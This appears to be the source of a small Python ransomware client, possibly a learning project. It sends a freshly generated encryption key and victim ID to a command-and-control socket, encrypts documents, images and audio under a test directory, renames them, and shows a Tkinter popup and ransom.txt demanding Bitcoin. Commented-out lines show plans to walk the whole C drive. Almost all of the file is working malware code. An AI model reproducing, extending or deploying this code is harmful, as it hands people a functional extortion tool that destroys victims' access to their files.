import os
from cryptography.fernet import Fernet
# client.py  
import socket
from random import randint
from tkinter import *
from tkinter import ttk
from pathlib import Path

#import pathlib
#drive = pathlib.Path.home().drive
#print(drive)
#Goes through all directories and files on C drive
#for root, dirs, files in os.walk(r"C:\\"):

sendID = randint(10000000,99999999)
#Uses Fernet symmetric encryption for speed. This should be sent to the C&C server once that is set up so the files can be decrypted after program has been run
key = Fernet.generate_key()
fernet = Fernet(key)

# create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
# get local machine name
host = socket.gethostname()                           
port = 9999
# connection to hostname on the port.
s.connect((host, port))                               

s.send(key + int.to_bytes(sendID,8,"big"))
# Receive no more than 1024 bytes
recvmessage = s.recv(1024)                                     
s.close()

print("Msg from server:" , recvmessage)
if recvmessage != b'confirmed':
    print("could not get confirmation from server")
    exit()

#extensions to be encrypted
extensions = ["pdf", "txt", "mp3", "jpg", "pptx", "docx"]

with open("id.id", "x") as f:
    f.write(str(sendID))
    f.close()
#with open('not.key', 'wb') as f:
#   f.write(key)
#   f.close()
#goes through this current directory and encrypts ALL files that are not ransomware.py
for root, dirs, files in os.walk(r"./TestDirectories", topdown=False):
    for name in files:    
        #separate extension from current file
        ext = name.rsplit('.', 1)
        if (len(ext) > 1):
            ext = ext[1]
            if (ext in extensions):
                curFile = os.path.join(root,name)
                with open(curFile, 'r+b') as f:
                    data = f.read()
                    f.seek(0)
                    extLength = len(ext)
                    paddedExt = ext
                    #sets first 5 char in file to be original file extension with added spaces as buffer
                    for i in range(5-extLength):
                        paddedExt = paddedExt + " "
                    f.write(bytearray(paddedExt, encoding='utf8'))
                    f.write(data)
                    f.seek(0)
                    data = f.read()
                    encrypted = fernet.encrypt(data)
                    f.seek(0)
                    f.write(encrypted)
                    print(curFile)
                    f.close()

                #renaming file to end with "encrypted"
                newName = curFile.rsplit('.', 1)
                newName[0] = newName[0] + ".encrypted" + ext
                os.rename(curFile, newName[0])
#print("You've been pwned. Send 999BTC to 23098c90ds. When done so, contact me@darkweb.com. You will need your id.id file.")

win = Tk()
win.geometry("750x270")

messagestring="You've been pwned.\nYour files have been locked.\n To unlock: \n Send all the BTC to 23098c90ds.\n When done so, contact me@darkweb.com.\n You will need your id.id file."
def open_popup():
   top= Toplevel(win)
   top.geometry("750x250")
   top.title("Bitcoin address")
   Label(top, text= messagestring, font=('Helvetica 14 bold')).place(x=150,y=80)

Label(win, text=" You've been HACKED. Press button below to see message.", font=('Helvetica 14 bold')).pack(pady=20)
#Create a button in the main Window to open the popup
ttk.Button(win, text= "Open", command= open_popup).pack()
win.mainloop()

f = open("ransom.txt", "w+")
f.write(messagestring)
f.close()